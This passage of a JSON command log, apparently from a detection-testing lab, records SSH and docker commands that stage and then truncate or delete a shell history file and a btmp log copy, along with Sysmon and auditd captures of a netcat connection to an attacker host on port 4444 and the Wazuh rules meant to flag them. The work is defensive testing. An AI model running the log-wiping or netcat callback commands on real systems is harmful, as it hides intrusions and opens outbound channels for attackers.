+    "command": "docker exec kt66-bastion bash -c 'ls -ld /home/ccc/book09-history /var/log/book09-btmp; sha256sum /var/log/btmp; stat -c \"%a %U %G %s %n\" /var/log/btmp; test -e /home/ccc/.bash_history; echo original_history_exists=$?'",
+    "stdout": "450b1eb3c0f14a0ee6be04e0ef164507633f605e70eaa456d24bcc34f18fa860  /var/log/btmp\n660 root utmp 12288 /var/log/btmp\noriginal_history_exists=1\n",
+    "stderr": "ls: cannot access '/home/ccc/book09-history': No such file or directory\nls: cannot access '/var/log/book09-btmp': No such file or directory\n",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:53:26.396074+00:00"
+  },
+  "case28-prepare": {
+    "command": "ssh -p 2204 -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 -o UserKnownHostsFile=/home/att/book09/known_hosts ccc@192.168.0.107 'test ! -e /home/ccc/book09-history && mkdir -m 700 /home/ccc/book09-history && printf '\"'\"'%s\\n'\"'\"' '\"'\"'echo book09-history'\"'\"' > /home/ccc/book09-history/.bash_history; test ! -e /var/log/book09-btmp && sudo cp -p /var/log/btmp /var/log/book09-btmp; ls -l /home/ccc/book09-history/.bash_history /var/log/book09-btmp'",
+    "stdout": "\rccc@192.168.0.107's password: \r\n-rw-rw-r-- 1 ccc  ccc     20 Nov  3 07:53 /home/ccc/book09-history/.bash_history\r\n-rw-rw---- 1 root utmp 12288 Nov  2 20:38 /var/log/book09-btmp\r\n",
+    "status": 0,
+    "timed_out": false,
+    "recorded_at": "2026-11-02T22:53:26.857851+00:00"
+  },
+  "case28-truncate-delete": {
+    "command": "ssh -p 2204 -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 -o UserKnownHostsFile=/home/att/book09/known_hosts ccc@192.168.0.107 '> /home/ccc/book09-history/.bash_history\nsudo rm /var/log/book09-btmp\nls -l /home/ccc/book09-history/.bash_history\ntest ! -e /var/log/book09-btmp; echo copy_absent=$?'",
+    "stdout": "\rccc@192.168.0.107's password: \r\n-rw-rw-r-- 1 ccc ccc 0 Nov  3 07:53 /home/ccc/book09-history/.bash_history\r\ncopy_absent=0\r\n",
+    "status": 0,
+    "timed_out": false,
+    "recorded_at": "2026-11-02T22:53:32.334456+00:00"
+  },
+  "case28-restore": {
+    "command": "docker exec kt66-bastion bash -c 'rm /home/ccc/book09-history/.bash_history && rmdir /home/ccc/book09-history; test ! -e /home/ccc/book09-history; echo fixture_absent=$?; sha256sum /var/log/btmp; test -e /home/ccc/.bash_history; echo original_history_exists=$?'",
+    "stdout": "fixture_absent=0\n450b1eb3c0f14a0ee6be04e0ef164507633f605e70eaa456d24bcc34f18fa860  /var/log/btmp\noriginal_history_exists=1\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:53:36.687444+00:00"
+  },
+  "installed-rules": {
+    "command": "docker exec kt66-siem bash -c 'sed -n '\"'\"'/<rule id=\"550\"/,/<\\/rule>/p; /<rule id=\"553\"/,/<\\/rule>/p; /<rule id=\"554\"/,/<\\/rule>/p; /<rule id=\"591\"/,/<\\/rule>/p'\"'\"' /var/ossec/ruleset/rules/0015-ossec_rules.xml; sed -n '\"'\"'/<rule id=\"80792\"/,/<\\/rule>/p'\"'\"' /var/ossec/ruleset/rules/0365-auditd_rules.xml; cat /var/ossec/etc/lists/audit-keys'",
+    "stdout": "  <rule id=\"550\" level=\"7\">\n    <category>ossec</category>\n    <decoded_as>syscheck_integrity_changed</decoded_as>\n    <description>Integrity checksum changed.</description>\n    <mitre>\n      <id>T1565.001</id>\n    </mitre>\n    <group>syscheck,syscheck_entry_modified,syscheck_file,pci_dss_11.5,gpg13_4.11,gdpr_II_5.1.f,hipaa_164.312.c.1,hipaa_164.312.c.2,nist_800_53_SI.7,tsc_PI1.4,tsc_PI1.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>\n  </rule>\n  <rule id=\"553\" level=\"7\">\n    <category>ossec</category>\n    <decoded_as>syscheck_deleted</decoded_as>\n    <description>File deleted.</description>\n    <mitre>\n      <id>T1070.004</id>\n      <id>T1485</id>\n    </mitre>\n    <group>syscheck,syscheck_entry_deleted,syscheck_file,pci_dss_11.5,gpg13_4.11,gdpr_II_5.1.f,hipaa_164.312.c.1,hipaa_164.312.c.2,nist_800_53_SI.7,tsc_PI1.4,tsc_PI1.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>\n  </rule>\n  <rule id=\"554\" level=\"5\">\n    <category>ossec</category>\n    <decoded_as>syscheck_new_entry</decoded_as>\n    <description>File added to the system.</description>\n    <group>syscheck,syscheck_entry_added,syscheck_file,pci_dss_11.5,gpg13_4.11,gdpr_II_5.1.f,hipaa_164.312.c.1,hipaa_164.312.c.2,nist_800_53_SI.7,tsc_PI1.4,tsc_PI1.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>\n  </rule>\n  <rule id=\"591\" level=\"3\">\n    <if_sid>500</if_sid>\n    <match>^ossec: File rotated </match>\n    <description>Log file rotated.</description>\n    <group>pci_dss_10.5.2,pci_dss_10.5.5,gpg13_10.1,gdpr_II_5.1.f,gdpr_IV_35.7.d,hipaa_164.312.b,nist_800_53_AU.9,tsc_CC6.1,tsc_CC7.2,tsc_CC7.3,tsc_PI1.4,tsc_PI1.5,tsc_CC7.1,tsc_CC8.1,</group>\n  </rule>\n  <rule id=\"80792\" level=\"3\">\n    <if_sid>80700</if_sid>\n    <list field=\"audit.key\" lookup=\"match_key_value\" check_value=\"command\">etc/lists/audit-keys</list>\n    <description>Audit: Command: $(audit.exe).</description>\n    <group>audit_command,gdpr_IV_30.1.g,</group>\n  </rule>\naudit-wazuh-w:write\naudit-wazuh-r:read\naudit-wazuh-a:attribute\naudit-wazuh-x:execute\naudit-wazuh-c:command\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:12:24.186442+00:00"
+  },
+  "sysmon-selected": {
+    "command": "timeout 15s journalctl -t sysmon --since '2026-11-03 07:52:25' --until '2026-11-03 07:52:28' --no-pager | grep -F '172438'",
+    "stdout": "Nov 03 07:52:26 ccc sysmon[71015]: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-11-02T22:52:26.215141000Z\"/><EventRecordID>186</EventRecordID><Correlation/><Execution ProcessID=\"71015\" ThreadID=\"71015\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ccc</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">kt66-process</Data><Data Name=\"UtcTime\">2026-11-02 22:52:26.218</Data><Data Name=\"ProcessGuid\">{13c79168-142a-6ae9-b5b4-ad78d2550000}</Data><Data Name=\"ProcessId\">172438</Data><Data Name=\"Image\">/usr/bin/nc.openbsd</Data><Data Name=\"FileVersion\">-</Data><Data Name=\"Description\">-</Data><Data Name=\"Product\">-</Data><Data Name=\"Company\">-</Data><Data Name=\"OriginalFileName\">-</Data><Data Name=\"CommandLine\">nc -N 192.168.0.108 4444</Data><Data Name=\"CurrentDirectory\">/home/ccc</Data><Data Name=\"User\">ccc</Data><Data Name=\"LogonGuid\">{13c79168-4c66-6ae8-e803-000000000000}</Data><Data Name=\"LogonId\">1000</Data><Data Name=\"TerminalSessionId\">82</Data><Data Name=\"IntegrityLevel\">no level</Data><Data Name=\"Hashes\">SHA256=0e10c84da5f1b48ebf5c283adfa5391a828cf5868320f02081c03e22f8d9b0fa</Data><Data Name=\"ParentProcessGuid\">{13c79168-142a-6ae9-6dbf-1ebd91550000}</Data><Data Name=\"ParentProcessId\">172435</Data><Data Name=\"ParentImage\">/usr/bin/bash</Data><Data Name=\"ParentCommandLine\">bash</Data><Data Name=\"ParentUser\">ccc</Data></EventData></Event>\nNov 03 07:52:26 ccc sysmon[71015]: <Event><System><Provider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-11-02T22:52:26.216916000Z\"/><EventRecordID>189</EventRecordID><Correlation/><Execution ProcessID=\"71015\" ThreadID=\"71015\"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ccc</Computer><Security UserId=\"0\"/></System><EventData><Data Name=\"RuleName\">kt66-network</Data><Data Name=\"UtcTime\">2026-11-02 22:52:26.222</Data><Data Name=\"ProcessGuid\">{13c79168-142a-6ae9-b5b4-ad78d2550000}</Data><Data Name=\"ProcessId\">172438</Data><Data Name=\"Image\">/usr/bin/nc.openbsd</Data><Data Name=\"User\">ccc</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIsIpv6\">false</Data><Data Name=\"SourceIp\">192.168.0.107</Data><Data Name=\"SourceHostname\">-</Data><Data Name=\"SourcePort\">57818</Data><Data Name=\"SourcePortName\">-</Data><Data Name=\"DestinationIsIpv6\">false</Data><Data Name=\"DestinationIp\">192.168.0.108</Data><Data Name=\"DestinationHostname\">-</Data><Data Name=\"DestinationPort\">4444</Data><Data Name=\"DestinationPortName\">-</Data></EventData></Event>\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:12:23.877607+00:00"
+  },
+  "bastion-final": {
+    "command": "docker exec kt66-bastion bash -c 'sha256sum /home/ccc/.ssh/authorized_keys /var/log/btmp; stat -c '\"'\"'%a %U %G %n'\"'\"' /etc/sudoers.d/ccc /home/ccc/.ssh /home/ccc/.ssh/authorized_keys; visudo -c; service cron status; for p in /etc/sudoers.d/99-book09-lab /etc/cron.d/book09-lab /home/ccc/book09-history /var/log/book09-btmp /tmp/book09-cron-result /root/book09-authorized_keys.before; do if test -e \"$p\"; then printf '\"'\"'REMAINS %s\n'\"'\"' \"$p\"; else printf '\"'\"'absent %s\n'\"'\"' \"$p\"; fi; done'",
+    "stdout": "bd0120b8a37a90bf87b05c2a7856bd3c76e50050799739c4a94a7cfc8b6421d1  /home/ccc/.ssh/authorized_keys\n450b1eb3c0f14a0ee6be04e0ef164507633f605e70eaa456d24bcc34f18fa860  /var/log/btmp\n440 root root /etc/sudoers.d/ccc\n755 ccc ccc /home/ccc/.ssh\n600 ccc ccc /home/ccc/.ssh/authorized_keys\n/etc/sudoers: parsed OK\n/etc/sudoers.d/README: parsed OK\n/etc/sudoers.d/ccc: parsed OK\n * cron is not running\nabsent /etc/sudoers.d/99-book09-lab\nabsent /etc/cron.d/book09-lab\nabsent /home/ccc/book09-history\nabsent /var/log/book09-btmp\nabsent /tmp/book09-cron-result\nabsent /root/book09-authorized_keys.before\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:12:24.883402+00:00"
+  },
+  "web-final": {
+    "command": "docker exec kt66-web bash -c 'sha256sum /usr/bin/yes; stat -c '\"'\"'%s %a %U %G %n'\"'\"' /usr/bin/yes; test ! -e /root/book09-yes.before && printf '\"'\"'backup removed\n'\"'\"''",
+    "stdout": "a63b5b6bd13460b0914b8bb4f4b08a3f2587f4cbcf630d771e364344b06a40b8  /usr/bin/yes\n31112 755 root root /usr/bin/yes\nbackup removed\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:12:25.174983+00:00"
+  },
+  "host-final": {
+    "command": "systemctl is-active wazuh-agent auditd; systemctl is-enabled wazuh-agent; auditctl -s; test ! -e /tmp/book09.fifo && printf 'FIFO absent\n'; ss -tn 'dport = :4444'",
+    "stdout": "active\nactive\ndisabled\nenabled 1\nfailure 1\npid 65008\nrate_limit 0\nbacklog_limit 8192\nlost 0\nbacklog 0\nbacklog_wait_time 60000\nbacklog_wait_time_actual 0\nloginuid_immutable 0 unlocked\nFIFO absent\nState Recv-Q Send-Q Local Address:Port Peer Address:PortProcess\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:12:25.410771+00:00"
+  },
+  "attacker-cleanup": {
+    "command": "ls -la /home/att/book09 /home/att/book09/www; ss -ltn 'sport = :8000 or sport = :4444'; rm /home/att/book09/book09_key /home/att/book09/book09_key.pub /home/att/book09/known_hosts /home/att/book09/http.log /home/att/book09/http.pid /home/att/book09/www/x.sh /home/att/book09/www/a.sh; rmdir /home/att/book09/www /home/att/book09; test ! -e /home/att/book09 && printf 'book09 workspace removed\n'",
+    "stdout": "/home/att/book09:\ntotal 32\ndrwx------ 3 att att 4096 Nov  2 22:51 .\ndrwxr-x--- 5 att att 4096 Nov  2 22:49 ..\n-rw------- 1 att att  411 Nov  2 22:50 book09_key\n-rw-r--r-- 1 att att   97 Nov  2 22:50 book09_key.pub\n-rw-rw-r-- 1 att att  345 Nov  2 22:53 http.log\n-rw-rw-r-- 1 att att    5 Nov  2 22:51 http.pid\n-rw-rw-r-- 1 att att  197 Nov  2 22:49 known_hosts\ndrwxrwxr-x 2 att att 4096 Nov  2 22:51 www\n\n/home/att/book09/www:\ntotal 16\ndrwxrwxr-x 2 att att 4096 Nov  2 22:51 .\ndrwx------ 3 att att 4096 Nov  2 22:51 ..\n-rw-rw-r-- 1 att att   78 Nov  2 22:51 a.sh\n-rw-rw-r-- 1 att att  102 Nov  2 22:51 x.sh\nState Recv-Q Send-Q Local Address:Port Peer Address:PortProcess\nbook09 workspace removed\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:12:24.612930+00:00"
+  },
+  "reader-ausearch": {
+    "command": "timeout 15s ausearch -if /var/log/audit/audit.log -a 6630 -i",
+    "stdout": "----\ntype=PROCTITLE msg=audit(11/03/2026 07:52:26.206:6630) : proctitle=nc -N 192.168.0.108 4444 \ntype=PATH msg=audit(11/03/2026 07:52:26.206:6630) : item=1 name=/lib64/ld-linux-x86-64.so.2 inode=1451894 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 \ntype=PATH msg=audit(11/03/2026 07:52:26.206:6630) : item=0 name=/usr/bin/nc inode=1442613 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 \ntype=CWD msg=audit(11/03/2026 07:52:26.206:6630) : cwd=/home/ccc \ntype=EXECVE msg=audit(11/03/2026 07:52:26.206:6630) : argc=4 a0=nc a1=-N a2=192.168.0.108 a3=4444 \ntype=SYSCALL msg=audit(11/03/2026 07:52:26.206:6630) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5591e79e85a0 a1=0x5591e79e8e90 a2=0x5591e79e5d80 a3=0x1b6 items=2 ppid=172435 pid=172438 auid=ccc uid=ccc gid=ccc euid=ccc suid=ccc fsuid=ccc egid=ccc sgid=ccc fsgid=ccc tty=(none) ses=82 comm=nc exe=/usr/bin/nc.openbsd subj=unconfined key=audit-wazuh-c \n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:22:44.299669+00:00"
+  },
+  "reader-C09-66": {
+    "command": "docker exec kt66-siem bash -c 'sed -n \\\n-e '\"'\"'/<rule id=\"550\"/,/<\\/rule>/p'\"'\"' \\\n-e '\"'\"'/<rule id=\"553\"/,/<\\/rule>/p'\"'\"' \\\n-e '\"'\"'/<rule id=\"554\"/,/<\\/rule>/p'\"'\"' \\\n/var/ossec/ruleset/rules/0015-ossec_rules.xml'",
+    "stdout": "  <rule id=\"550\" level=\"7\">\n    <category>ossec</category>\n    <decoded_as>syscheck_integrity_changed</decoded_as>\n    <description>Integrity checksum changed.</description>\n    <mitre>\n      <id>T1565.001</id>\n    </mitre>\n    <group>syscheck,syscheck_entry_modified,syscheck_file,pci_dss_11.5,gpg13_4.11,gdpr_II_5.1.f,hipaa_164.312.c.1,hipaa_164.312.c.2,nist_800_53_SI.7,tsc_PI1.4,tsc_PI1.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>\n  </rule>\n  <rule id=\"553\" level=\"7\">\n    <category>ossec</category>\n    <decoded_as>syscheck_deleted</decoded_as>\n    <description>File deleted.</description>\n    <mitre>\n      <id>T1070.004</id>\n      <id>T1485</id>\n    </mitre>\n    <group>syscheck,syscheck_entry_deleted,syscheck_file,pci_dss_11.5,gpg13_4.11,gdpr_II_5.1.f,hipaa_164.312.c.1,hipaa_164.312.c.2,nist_800_53_SI.7,tsc_PI1.4,tsc_PI1.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>\n  </rule>\n  <rule id=\"554\" level=\"5\">\n    <category>ossec</category>\n    <decoded_as>syscheck_new_entry</decoded_as>\n    <description>File added to the system.</description>\n    <group>syscheck,syscheck_entry_added,syscheck_file,pci_dss_11.5,gpg13_4.11,gdpr_II_5.1.f,hipaa_164.312.c.1,hipaa_164.312.c.2,nist_800_53_SI.7,tsc_PI1.4,tsc_PI1.5,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,</group>\n  </rule>\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:22:43.409249+00:00"
+  },
+  "reader-C09-67": {
+    "command": "docker exec kt66-siem bash -c 'sed -n '\"'\"'/<rule id=\"591\"/,/<\\/rule>/p'\"'\"' \\\n/var/ossec/ruleset/rules/0015-ossec_rules.xml'",
+    "stdout": "  <rule id=\"591\" level=\"3\">\n    <if_sid>500</if_sid>\n    <match>^ossec: File rotated </match>\n    <description>Log file rotated.</description>\n    <group>pci_dss_10.5.2,pci_dss_10.5.5,gpg13_10.1,gdpr_II_5.1.f,gdpr_IV_35.7.d,hipaa_164.312.b,nist_800_53_AU.9,tsc_CC6.1,tsc_CC7.2,tsc_CC7.3,tsc_PI1.4,tsc_PI1.5,tsc_CC7.1,tsc_CC8.1,</group>\n  </rule>\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:22:43.712620+00:00"
+  },
+  "reader-C09-68": {
+    "command": "docker exec kt66-siem bash -c 'sed -n '\"'\"'/<rule id=\"80792\"/,/<\\/rule>/p'\"'\"' \\\n/var/ossec/ruleset/rules/0365-auditd_rules.xml\ncat /var/ossec/etc/lists/audit-keys'",
+    "stdout": "  <rule id=\"80792\" level=\"3\">\n    <if_sid>80700</if_sid>\n    <list field=\"audit.key\" lookup=\"match_key_value\" check_value=\"command\">etc/lists/audit-keys</list>\n    <description>Audit: Command: $(audit.exe).</description>\n    <group>audit_command,gdpr_IV_30.1.g,</group>\n  </rule>\naudit-wazuh-w:write\naudit-wazuh-r:read\naudit-wazuh-a:attribute\naudit-wazuh-x:execute\naudit-wazuh-c:command\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:22:44.014535+00:00"
+  },
+  "local-help": {
+    "command": "nc -h 2>&1; dpkg --version | head -n 1; bash -c 'help set' | head -n 8",
+    "stdout": "OpenBSD netcat (Debian patchlevel 1.218-4ubuntu1)\nusage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]\n\t  [-m minttl] [-O length] [-P proxy_username] [-p source_port]\n\t  [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]\n\t  [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]\n\t  [destination] [port]\n\tCommand Summary:\n\t\t-4\t\tUse IPv4\n\t\t-6\t\tUse IPv6\n\t\t-b\t\tAllow broadcast\n\t\t-C\t\tSend CRLF as line-ending\n\t\t-D\t\tEnable the debug socket option\n\t\t-d\t\tDetach from stdin\n\t\t-F\t\tPass socket fd\n\t\t-h\t\tThis help text\n\t\t-I length\tTCP receive buffer length\n\t\t-i interval\tDelay interval for lines sent, ports scanned\n\t\t-k\t\tKeep inbound sockets open for multiple connects\n\t\t-l\t\tListen mode, for inbound connects\n\t\t-M ttl\t\tOutgoing TTL / Hop Limit\n\t\t-m minttl\tMinimum incoming TTL / Hop Limit\n\t\t-N\t\tShutdown the network socket after EOF on stdin\n\t\t-n\t\tSuppress name/port resolutions\n\t\t-O length\tTCP send buffer length\n\t\t-P proxyuser\tUsername for proxy authentication\n\t\t-p port\t\tSpecify local port for remote connects\n\t\t-q secs\t\tquit after EOF on stdin and delay of secs\n\t\t-r\t\tRandomize remote ports\n\t\t-S\t\tEnable the TCP MD5 signature option\n\t\t-s sourceaddr\tLocal source address\n\t\t-T keyword\tTOS value\n\t\t-t\t\tAnswer TELNET negotiation\n\t\t-U\t\tUse UNIX domain socket\n\t\t-u\t\tUDP mode\n\t\t-V rtable\tSpecify alternate routing table\n\t\t-v\t\tVerbose\n\t\t-W recvlimit\tTerminate after receiving a number of packets\n\t\t-w timeout\tTimeout for connects and final net reads\n\t\t-X proto\tProxy protocol: \"4\", \"5\" (SOCKS) or \"connect\"\n\t\t-x addr[:port]\tSpecify proxy address and port\n\t\t-Z\t\tDCCP mode\n\t\t-z\t\tZero-I/O mode [used for scanning]\n\tPort numbers can be individual or ranges: lo-hi [inclusive]\nDebian 'dpkg' package management program version 1.21.1 (amd64).\nset: set [-abefhkmnptuvxBCHP] [-o option-name] [--] [arg ...]\n    Set or unset values of shell options and positional parameters.\n    \n    Change the value of shell attributes and positional parameters, or\n    display the names and values of shell variables.\n    \n    Options:\n      -a  Mark variables which are modified or created for export.\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T23:22:44.498930+00:00"
+  }
+}
